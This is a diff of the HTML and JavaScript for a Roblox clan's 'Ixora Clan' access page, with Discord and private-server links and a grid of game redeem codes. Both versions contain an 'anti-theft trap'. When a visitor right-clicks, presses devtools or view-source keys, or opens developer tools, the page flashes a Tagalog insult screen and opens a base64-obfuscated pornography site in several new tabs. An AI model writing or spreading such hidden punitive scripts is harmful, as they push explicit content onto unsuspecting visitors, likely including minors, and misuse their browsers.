@@ -1,17 +1,248 @@
 <!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Ixora Clan | Access</title><link rel="icon" type="image/png" href="logo.jpg"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"><style>:root{--d:#000;--tg:#b5bac1;--r:25px;--ng:#00ff88;--nr:#ff4444;--db:#5865F2}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(rgba(0,0,0,.85),rgba(0,0,0,.85)),url(BGM.png) center/cover fixed;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;overflow:hidden;user-select:none;transition:background-color .3s}#loader{position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;transition:opacity .6s,visibility .6s}#loader img{width:150px;border-radius:20px;cursor:pointer;transition:.3s;border:2px solid #fff;margin-bottom:20px;animation:p 2s infinite}#loader p{letter-spacing:3px;font-weight:700;animation:fio 1.5s infinite}@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.05);box-shadow:0 0 30px rgba(255,255,255,.2)}}@keyframes fio{0%,100%{opacity:.3}50%{opacity:1}}.form-container{position:relative;background:var(--d);padding:50px 40px;border-radius:var(--r);width:100%;max-width:480px;overflow:hidden;z-index:10;box-shadow:0 10px 50px #000;display:none;text-align:center}.form-container.active{display:block;animation:fi .4s ease-out}#codePage.active{max-width:550px}@keyframes rot{100%{transform:rotate(360deg)}}@keyframes fi{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}@keyframes sk{0%,100%{transform:translateX(0)}25%{transform:translateX(-2px)}75%{transform:translateX(2px)}}@keyframes tj{0%,100%{transform:scale(1)translate(0,0)}25%{transform:scale(1.2)translate(-20px,20px)rotate(-5deg)}50%{transform:scale(.9)translate(20px,-20px)rotate(5deg)}}.form-container::before{content:'';position:absolute;z-index:-2;inset:-50%;background:conic-gradient(#f00,#0f0,#00f,#ff0,#f00);animation:rot 15s linear infinite}.form-container::after{content:'';position:absolute;z-index:-1;inset:4px;background:var(--d);border-radius:21px}.header-image{display:block;margin:0 auto 25px;width:130px;border-radius:15px}h1{font-size:28px;margin-top:0}p{color:var(--tg);font-size:16px;margin-bottom:35px}.social-buttons-container{display:flex;flex-direction:column;align-items:center;gap:20px}.btn-social{position:relative;display:flex;align-items:center;justify-content:space-between;padding:20px 25px;background:0 0;color:#fff;font-weight:700;font-size:17px;border-radius:15px;z-index:1;overflow:hidden;transition:.3s;border:none;cursor:pointer;width:100%;box-sizing:border-box}.btn-social::before{content:'';position:absolute;z-index:-2;inset:-50%;background:conic-gradient(from 0deg,#f00,#0f0,#00f,#f0f,#f00);animation:rot 10s linear infinite}.btn-social::after{content:'';position:absolute;z-index:-1;inset:2.5px;background:#000;border-radius:13px}.btn-social:hover{transform:scale(1.04)}.btn-content-wrapper{display:flex;align-items:center;gap:12px;pointer-events:none}.discord-count,.status-dot{background:var(--db);padding:2px 12px;border-radius:12px;font-size:11px;display:flex;align-items:center;justify-content:center;min-width:85px;height:24px;z-index:2;margin-left:auto}.status-dot{color:var(--ng);background:0 0;border:1px solid var(--ng);text-transform:uppercase;letter-spacing:1px}.status-due{color:var(--nr)!important;border-color:var(--nr)!important}.btn-due{animation:sk .5s infinite}.codes-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;max-height:380px;overflow-y:auto;padding:10px}.btn-copy{font-size:12px;padding:15px;text-transform:uppercase}.mute-toggle{position:absolute;top:20px;right:20px;width:50px;height:50px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:100;border:none;color:#fff;font-size:20px}#fireCanvas{position:fixed;bottom:0;left:0;width:100%;height:350px;z-index:1;pointer-events:none}.trap-screen{display:none;position:fixed;inset:0;background:red;z-index:999999;flex-direction:column;justify-content:center;align-items:center;animation:flR .1s infinite}@keyframes flR{0%,100%{background:red}50%{background:#000}}.trap-screen h1{font-size:15vw;color:#fff;text-shadow:10px 10px #000;margin:0;animation:tj .2s infinite}.trap-screen p{color:#ff0;font-weight:700;font-size:24px;animation:tj .3s infinite reverse}@media (max-width:480px){.btn-social{flex-direction:column-reverse;gap:10px}.discord-count,.status-dot{margin-left:0;width:100%}}</style>
-<meta name="ix-signature" content="QU5PIEJPSSBLQVlBIFBBID8=">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Ixora Clan | Access</title>
+    <link rel="icon" type="image/png" href="logo.jpg">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <style>
+        :root { --d: #000; --tg: #b5bac1; --r: 25px; --ng: #00ff88; --nr: #ff4444; --db: #5865F2 }
+        /* Hides system pointer */
+        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(rgba(0,0,0,.85), rgba(0,0,0,.85)), url(BGM.png) center/cover fixed; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; overflow: hidden; user-select: none; transition: background-color .3s; cursor: none }
+        
+        /* Custom Cursor Styles */
+        #customCursor { width: 20px; height: 26px; background: var(--ng); position: fixed; pointer-events: none; z-index: 99999999; clip-path: polygon(0% 0%, 100% 70%, 40% 70%, 40% 100%); filter: drop-shadow(0 0 8px var(--ng)); transition: transform .1s ease-out, background .2s, filter .2s; top: -50px; left: -50px; }
+        
+        #loader { position: fixed; inset: 0; background: #000; z-index: 9999999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity .6s, visibility .6s }
+        #loader img { width: 150px; border-radius: 20px; cursor: pointer; transition: .3s; border: 2px solid #fff; margin-bottom: 20px; animation: p 2s infinite }
+        #loader p { letter-spacing: 3px; font-weight: 700; animation: fio 1.5s infinite }
+        @keyframes p { 0%, 100% { transform: scale(1) } 50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,255,255,.2) } }
+        @keyframes fio { 0%, 100% { opacity: .3 } 50% { opacity: 1 } }
+        .form-container { position: relative; background: var(--d); padding: 50px 40px; border-radius: var(--r); width: 100%; max-width: 480px; overflow: hidden; z-index: 10; box-shadow: 0 10px 50px #000; display: none; text-align: center }
+        .form-container.active { display: block; animation: fi .4s ease-out }
+        #codePage.active { max-width: 650px }
+        @keyframes rot { 100% { transform: rotate(360deg) } }
+        @keyframes fi { from { opacity: 0; transform: translateY(15px) } to { opacity: 1; transform: translateY(0) } }
+        @keyframes sk { 0%, 100% { transform: translateX(0) } 25% { transform: translateX(-2px) } 75% { transform: translateX(2px) } }
+        @keyframes tj { 0%, 100% { transform: scale(1) translate(0,0) } 25% { transform: scale(1.2) translate(-20px,20px) rotate(-5deg) } 50% { transform: scale(.9) translate(20px,-20px) rotate(5deg) } }
+        .form-container::before { content: ''; position: absolute; z-index: -2; inset: -50%; background: conic-gradient(#f00, #0f0, #00f, #ff0, #f00); animation: rot 15s linear infinite }
+        .form-container::after { content: ''; position: absolute; z-index: -1; inset: 4px; background: var(--d); border-radius: 21px }
+        .header-image { display: block; margin: 0 auto 25px; width: 130px; border-radius: 15px }
+        h1 { font-size: 28px; margin-top: 0 }
+        p { color: var(--tg); font-size: 16px; margin-bottom: 35px }
+        .social-buttons-container { display: flex; flex-direction: column; align-items: center; gap: 20px }
+        .btn-social { position: relative; display: flex; align-items: center; justify-content: space-between; padding: 20px 25px; background: 0 0; color: #fff; font-weight: 700; font-size: 17px; border-radius: 15px; z-index: 1; overflow: hidden; transition: .3s; border: none; cursor: pointer; width: 100%; box-sizing: border-box }
+        .btn-social::before { content: ''; position: absolute; z-index: -2; inset: -50%; background: conic-gradient(from 0deg, #f00, #0f0, #00f, #f0f, #f00); animation: rot 10s linear infinite }
+        .btn-social::after { content: ''; position: absolute; z-index: -1; inset: 2.5px; background: #000; border-radius: 13px }
+        .btn-social:hover { transform: scale(1.04) }
+        .btn-content-wrapper { display: flex; align-items: center; gap: 12px; pointer-events: none }
+        .discord-count, .status-dot { background: var(--db); padding: 2px 12px; border-radius: 12px; font-size: 11px; display: flex; align-items: center; justify-content: center; min-width: 85px; height: 24px; z-index: 2; margin-left: auto }
+        .status-dot { color: var(--ng); background: 0 0; border: 1px solid var(--ng); text-transform: uppercase; letter-spacing: 1px }
+        .status-due { color: var(--nr)!important; border-color: var(--nr)!important }
+        .btn-due { animation: sk .5s infinite }
+        .codes-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-height: 400px; overflow-y: auto; padding: 10px; scrollbar-width: thin; scrollbar-color: var(--db) #000; }
+        .btn-copy { font-size: 11px; padding: 15px; text-transform: uppercase; justify-content: center; gap: 10px; }
+        .mute-toggle { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 100; border: none; color: #fff; font-size: 20px }
+        #fireCanvas { position: fixed; bottom: 0; left: 0; width: 100%; height: 350px; z-index: 1; pointer-events: none }
+        .trap-screen { display: none; position: fixed; inset: 0; background: red; z-index: 999999; flex-direction: column; justify-content: center; align-items: center; animation: flR .1s infinite }
+        @keyframes flR { 0%, 100% { background: red } 50% { background: #000 } }
+        .trap-screen h1 { font-size: 12vw; font-weight: 900; color: #fff; text-shadow: 10px 10px #000; margin: 0; animation: tj .2s infinite }
+        .trap-screen p { color: #ff0; font-weight: 700; font-size: 24px; animation: tj .3s infinite reverse; text-align: center; padding: 0 20px; }
+        @media (max-width: 480px) { .btn-social { flex-direction: column-reverse; gap: 10px } .discord-count, .status-dot { margin-left: 0; width: 100% } .codes-grid { grid-template-columns: 1fr; } #customCursor { display: none } body { cursor: auto } }
+    </style>
 </head>
-<body oncontextmenu="return!1">
+<body oncontextmenu="return false">
+    <div id="customCursor"></div>
+
     <div id="loader"><img src="logo.jpg" id="startBtn"><p>CLICK LOGO TO ENTER</p></div>
     <audio id="v1" preload="auto"><source src="labsong.mp3" type="audio/mpeg"></audio>
     <audio id="v2" preload="auto"><source src="Nice (meme) - Sound Effect.mp3" type="audio/mpeg"></audio>
-    <button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
-    <div class="form-container active" id="mainPage"><img src="logo.jpg" class="header-image"><h1>Welcome to Ixora Clan!</h1><p>Complete the steps below to join us.</p><div class="social-buttons-container"><button onclick="_nav('aHR0cHM6Ly9kaXNjb3JkLmdnL3NYY2N5MmZ5Tlo=')" class="btn-social"><div class="btn-content-wrapper"><i class="bi bi-discord"></i><span>Join Discord</span></div><span class="discord-count" id="discordOnline">Check...</span></button><button onclick="_nav('aHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy8xNDU5NDk5NDgxMDgxODM5NzgzLzE0NTk0OTk0ODI0Nzg4MDUxNzAvMTQ2MzE1Njk3MzczNzYwNzI4MQ==')" class="btn-social"><div class="btn-content-wrapper"><i class="bi bi-shield-check"></i><span>Gain Access</span></div></button><button onclick="_page('serverPage')" class="btn-social"><div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Private Servers</span></div></button><button onclick="_page('codePage')" class="btn-social"><div class="btn-content-wrapper"><i class="bi bi-code-slash"></i><span>Redeem Codes</span></div></button></div></div>
-    <div class="form-container" id="serverPage"><h1>Private Servers</h1><div class="social-buttons-container"><button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPTExZmMzMTE3Yzc2NDFmNDc5N2Y3YzRkZWM1YzllZGVlJnR5cGU9U2VydmVy')" class="btn-social"><div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Ixora Server 1</span></div><span class="status-dot">Online</span></button><button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPWQ1ZTVhYTU5NWZmMmIwNGVhZTM4YWRjZGFmNWYxNTYwJnR5cGU9U2VydmVy')" class="btn-social"><div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Ixora Server 2</span></div><span class="status-dot">Online</span></button><button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPTIwNzkxOTk2MWMxM2ExNDFmOGRkNjY2YjI0MWI1OTEmdHlwZT1TZXJ2ZXI=')" class="btn-social btn-due"><div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Ixora Server 3</span></div><span class="status-dot status-due">Monthly Due</span></button><button onclick="_page('mainPage')" class="btn-social"><div class="btn-content-wrapper">Go Back</div></button></div></div>
-    <div class="form-container" id="codePage"><h1>Active Codes</h1><div class="codes-grid" id="codesGrid">Loading...</div><button onclick="_page('mainPage')" class="btn-social" style="margin-top:20px"><div class="btn-content-wrapper">Go Back</div></button></div>
-    <canvas id="fireCanvas"></canvas>
     <audio id="bgMusic" loop><source src="IXORA EY.mp3" type="audio/mpeg"></audio>
-<script>
-(function(){const d=document,s=i=>d.getElementById(i),a=b=>atob(b),_M=s('v1'),_N=s('v2'),_B=s('bgMusic'),_I=s('muteIcon');let _T=!1;const _L=()=>{if(_T)return;_T=!0;let e=d.createElement('div');e.innerHTML=a('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48cD5OYWdoYWhhbmFwIGthIGJhIG5nIGNvZGVzPyBLdXBhbCBrYSBiYSBib2k/IPCfnanwnZicPC9wPjwvZGl2Pg==');d.body.appendChild(e.firstChild);s('tz').style.display='flex';_B.pause();_M.currentTime=0;_M.play().catch(()=>{});setTimeout(()=>{for(let i=0;i<10;i++)window.open(a('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'),'_blank')},2e3)};d.oncontextmenu=e=>(e.preventDefault(),_L(),!1);d.onkeydown=e=>{(123==e.keyCode||e.ctrlKey&&e.shiftKey&&(73==e.keyCode||74==e.keyCode)||e.ctrlKey&&85==e.keyCode)&&(_L(),!1)};setInterval(()=>{_T&&_M.play().catch(()=>{});(window.outerHeight-window.innerHeight>160||window.outerWidth-window.innerWidth>160)&&_L()},2e3);_B.volume=.4;s('startBtn').onclick=()=>{s('loader').style.opacity='0';setTimeout(()=>{s('loader').style.visibility='hidden';_B.paused&&_B.play().then(()=>_I.className='bi bi-volume-up-fill').catch(()=>{})},600)};fetch(a('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvZ3VpbGRzLzE0NTk0OTk0ODEwODE4Mzk3ODMvd2lkZ2V0Lmpzb24=')).then(r=>r.json()).then(o=>{s('discordOnline').innerText=(o.presence_count||0)+' Online'}).catch(()=>s('discordOnline').innerText='Join Us');fetch(a('aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Zb3J1c2Vuc2VpLzA5N2VlZmE3YjUwZGQwZjBmMGE4ZDk5MTc2NDE4MWZlL3Jhdy9lNzZlZDA4ZWVkOGNkMDcyZjNlM2E5ZDYxYzIzZTMyMzk5NWM2ODFiL2NvZGVzLmpzb24=')).then(r=>r.json()).then(c=>{const g=s('codesGrid');g.innerHTML='';c.forEach(v=>{const k=d.createElement('button');k.className='btn-social btn-copy';k.innerHTML=`<span>${v}</span> <i class="bi bi-copy"></i>`;k.onclick=()=>{navigator.clipboard.writeText(v);_N.currentTime=0;_N.play();d.body.style.backgroundColor=['#0FF','#0F0','#F0F','#FA0'][Math.floor(4*Math.random())];setTimeout(()=>d.body.style.backgroundColor='',300);k.innerHTML='COPIED!';setTimeout(()=>k.innerHTML=`<span>${v}</span> <i class="bi bi-copy"></i>`,1e3)};g.appendChild(k)})});window._page=p=>{d.querySelectorAll('.form-container').forEach(c=>c.classList.remove('active'));s(p).classList.add('active')};window._nav=l=>{window.open(a(l),'_blank')};s('muteBtn').onclick=e=>{e.stopPropagation();_B.paused?(_B.play(),_I.className='bi bi-volume-up-fill'):(_B.pause(),_I.className='bi bi-volume-mute-fill')};const _v=s('fireCanvas'),_x=_v.getContext('2d');let _p=[];const _r=()=>(_v.width=window.innerWidth,_v.height=350);window.onresize=_r;_r();class _f{constructor(){this.x=Math.random()*_v.width;this.y=_v.height+50;this.sY=2.5*Math.random()+1.5;this.sX=2*(Math.random()-.5);this.sz=25*Math.random()+15;this.l=1;this.d=.015*Math.random()+.005}u(){this.y-=this.sY;this.x+=this.sX;this.l-=this.d;this.sz>.5&&(this.sz-=.15)}dr(){_x.globalCompositeOperation='lighter';_x.fillStyle=`rgba(255,${Math.floor(100*Math.random()+50)},0,${this.l})`;_x.beginPath();_x.arc(this.x,this.y,this.sz,0,2*Math.PI);_x.fill()}}function _a(){_x.clearRect(0,0,_v.width,_v.height);if(_p.length<350)for(let i=0;i<8;i++)_p.push(new _f);_p.forEach((p,i)=>{p.u();p.dr();p.l<=0&&_p.splice(i,1)});requestAnimationFrame(_a)}_a()})()
-</script></body></html>
+    <button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
+
+    <div class="form-container active" id="mainPage">
+        <img src="logo.jpg" class="header-image">
+        <h1>Welcome to Ixora Clan!</h1>
+        <p>Complete the steps below to join us.</p>
+        <div class="social-buttons-container">
+            <button onclick="_nav('aHR0cHM6Ly9kaXNjb3JkLmdnL3NYY2N5MmZ5Tlo=')" class="btn-social">
+                <div class="btn-content-wrapper"><i class="bi bi-discord"></i><span>Join Discord</span></div>
+                <span class="discord-count" id="discordOnline">Check...</span>
+            </button>
+            <button onclick="_nav('aHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy8xNDU5NDk5NDgxMDgxODM5NzgzLzE0NTk0OTk0ODI0Nzg4MDUxNzAvMTQ2MzE1Njk3MzczNzYwNzI4MQ==')" class="btn-social">
+                <div class="btn-content-wrapper"><i class="bi bi-shield-check"></i><span>Gain Access</span></div>
+            </button>
+            <button onclick="_page('serverPage')" class="btn-social">
+                <div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Private Servers</span></div>
+            </button>
+            <button onclick="_page('codePage')" class="btn-social">
+                <div class="btn-content-wrapper"><i class="bi bi-code-slash"></i><span>Redeem Codes</span></div>
+            </button>
+        </div>
+    </div>
+
+    <div class="form-container" id="serverPage">
+        <h1>Private Servers</h1>
+        <div class="social-buttons-container">
+            <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPTExZmMzMTE3Yzc2NDFmNDc5N2Y3YzRkZWM1YzllZGVlJnR5cGU9U2VydmVy')" class="btn-social">
+                <div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Ixora Server 1</span></div><span class="status-dot">Online</span>
+            </button>
+            <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPWQ1ZTVhYTU5NWZmMmIwNGVhZTM4YWRjZGFmNWYxNTYwJnR5cGU9U2VydmVy')" class="btn-social">
+                <div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Ixora Server 2</span></div><span class="status-dot">Online</span>
+            </button>
+            <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPTIwNzkxOTk2MWMxM2ExNDFmOGRkNjY2YjI0MWI1OTEmdHlwZT1TZXJ2ZXI=')" class="btn-social btn-due">
+                <div class="btn-content-wrapper"><i class="bi bi-controller"></i><span>Ixora Server 3</span></div><span class="status-dot status-due">Monthly Due</span>
+            </button>
+            <button onclick="_page('mainPage')" class="btn-social"><div class="btn-content-wrapper">Go Back</div></button>
+        </div>
+    </div>
+
+    <div class="form-container" id="codePage">
+        <h1>Active Codes</h1>
+        <div class="codes-grid" id="codesGrid"></div>
+        <button onclick="_page('mainPage')" class="btn-social" style="margin-top:20px"><div class="btn-content-wrapper">Go Back</div></button>
+    </div>
+
+    <canvas id="fireCanvas"></canvas>
+
+    <script>
+        (function() {
+            const d = document, s = i => d.getElementById(i), a = b => atob(b);
+            const _M = s('v1'), _N = s('v2'), _B = s('bgMusic'), _I = s('muteIcon'), _C = s('customCursor');
+            let _triggered = false;
+
+            // --- ACCURATE DISCORD ONLINE COUNT ---
+            const _0xG = '1459499481081839783'; 
+            async function _upd() {
+                try {
+                    const r = await fetch(`https://discord.com/api/guilds/${_0xG}/widget.json`);
+                    const j = await r.json();
+                    s('discordOnline').innerText = (j.presence_count || 0) + ' Online';
+                } catch (e) { s('discordOnline').innerText = 'Online'; }
+            }
+            _upd(); setInterval(_upd, 60000);
+
+            // --- CURSOR LOGIC ---
+            d.addEventListener('mousemove', e => { _C.style.left = e.clientX + 'px'; _C.style.top = e.clientY + 'px'; });
+            d.addEventListener('mouseover', e => {
+                if (e.target.closest('.btn-social, #startBtn, .mute-toggle')) {
+                    _C.style.transform = 'scale(1.4)';
+                    _C.style.background = '#fff';
+                    _C.style.filter = 'drop-shadow(0 0 12px #fff)';
+                }
+            });
+            d.addEventListener('mouseout', () => {
+                _C.style.transform = 'scale(1)';
+                _C.style.background = 'var(--ng)';
+                _C.style.filter = 'drop-shadow(0 0 8px var(--ng))';
+            });
+
+            // UPDATED CODE LIST
+            const activeCodes = ["150KLIKES","KURAMANEXTWEEK","25MVisits","125KLIKES","50KFAVORITES","BUGSPATCH1","BUGSPATCH2","BUGSPATCH3","BUGSPATCH4","UPDATETHISWEEKEND","100KLIKES","NEWCHIKARACODE","75KLIKES","ALMOST100KKLIKES","MOREYEN","MORECHIKARA","HappyNewYear","50kLikes","10MVisits","NewBloodlines","15kLikes","25kLikes","30kLikes","MinorBugs","BadActors","JanuaryIncident","Krampus","SecretCode","ChristmasTime","10kLikes","1MVisits","ChristmasDelay","Gullible67","FreeChikara3","FreeChikara2","FreeChikara","YenCode","WednesdayYenCode","WednesdayBoostsCode"];
+
+            // ANTI-THEFT TRAP
+            const _L = () => {
+                if (_triggered) return;
+                _triggered = true;
+                _C.style.display = 'none';
+                let e = d.createElement('div');
+                e.innerHTML = a('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48cD5OYWdoYWhhbmFwIGthIGJhIG5nIGNvZGVzPyBLdXBhbCBrYSBiYSBib2k/IPCfnanwnZicPC9wPjwvZGl2Pg==');
+                d.body.appendChild(e.firstChild);
+                s('tz').style.display = 'flex';
+                _B.pause();
+                _M.currentTime = 0;
+                _M.play().catch(() => {});
+                setTimeout(() => {
+                    for (let i = 0; i < 5; i++) window.open(a('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'), '_blank');
+                }, 2000);
+            };
+
+            // BLOCKING KEYS & CLICKS
+            d.oncontextmenu = e => { e.preventDefault(); _L(); return false; };
+            d.onkeydown = e => {
+                const forbidden = (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || ((e.ctrlKey || e.metaKey) && e.keyCode === 85));
+                if (forbidden) { e.preventDefault(); _L(); return false; }
+            };
+
+            // DEVTOOLS DETECTION
+            setInterval(() => {
+                if (_triggered) return;
+                if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) _L();
+            }, 1000);
+
+            // INITIALIZE CODES
+            const initCodes = () => {
+                const g = s('codesGrid');
+                g.innerHTML = '';
+                activeCodes.forEach(v => {
+                    const k = d.createElement('button');
+                    k.className = 'btn-social btn-copy';
+                    k.innerHTML = `<span>${v}</span> <i class="bi bi-copy"></i>`;
+                    k.onclick = () => {
+                        navigator.clipboard.writeText(v);
+                        _N.currentTime = 0; _N.play();
+                        d.body.style.backgroundColor = '#5865F2';
+                        setTimeout(() => d.body.style.backgroundColor = '', 200);
+                        k.innerHTML = 'COPIED!';
+                        setTimeout(() => k.innerHTML = `<span>${v}</span> <i class="bi bi-copy"></i>`, 1000);
+                    };
+                    g.appendChild(k);
+                });
+            };
+            initCodes();
+
+            // UI LOGIC
+            _B.volume = 0.4;
+            s('startBtn').onclick = () => {
+                s('loader').style.opacity = '0';
+                setTimeout(() => {
+                    s('loader').style.visibility = 'hidden';
+                    _B.play().then(() => _I.className = 'bi bi-volume-up-fill').catch(() => {});
+                }, 600);
+            };
+
+            s('muteBtn').onclick = e => {
+                e.stopPropagation();
+                _B.paused ? (_B.play(), _I.className = 'bi bi-volume-up-fill') : (_B.pause(), _I.className = 'bi bi-volume-mute-fill');
+            };
+
+            window._page = p => {
+                d.querySelectorAll('.form-container').forEach(c => c.classList.remove('active'));
+                s(p).classList.add('active');
+            };
+            window._nav = l => { window.open(a(l), '_blank'); };
+
+            // FIRE EFFECTS
+            const _v = s('fireCanvas'), _x = _v.getContext('2d');
+            let _p = [];
+            const _r = () => { _v.width = window.innerWidth; _v.height = 350; };
+            window.onresize = _r; _r();
+            class _f {
+                constructor() {
+                    this.x = Math.random() * _v.width;
+                    this.y = _v.height + 50;
+                    this.sY = 2.5 * Math.random() + 1.5;
+                    this.sX = 2 * (Math.random() - .5);
+                    this.sz = 20 * Math.random() + 10;
+                    this.l = 1;
+                    this.d = .015 * Math.random() + .005;
+                }
+                u() { this.y -= this.sY; this.x += this.sX; this.l -= this.d; if (this.sz > .5) this.sz -= .1; }
+                dr() {
+                    _x.globalCompositeOperation = 'lighter';
+                    _x.fillStyle = `rgba(255, ${Math.floor(Math.random() * 100 + 50)}, 0, ${this.l})`;
+                    _x.beginPath(); _x.arc(this.x, this.y, this.sz, 0, 2 * Math.PI); _x.fill();
+                }
+            }
+            function _an() {
+                _x.clearRect(0, 0, _v.width, _v.height);
+                if (_p.length < 200) for (let i = 0; i < 5; i++) _p.push(new _f);
+                _p.forEach((p, i) => { p.u(); p.dr(); if (p.l <= 0) _p.splice(i, 1); });
+                requestAnimationFrame(_an);
+            }
+            _an();
+        })();
+    </script>
+</body>
+</html>
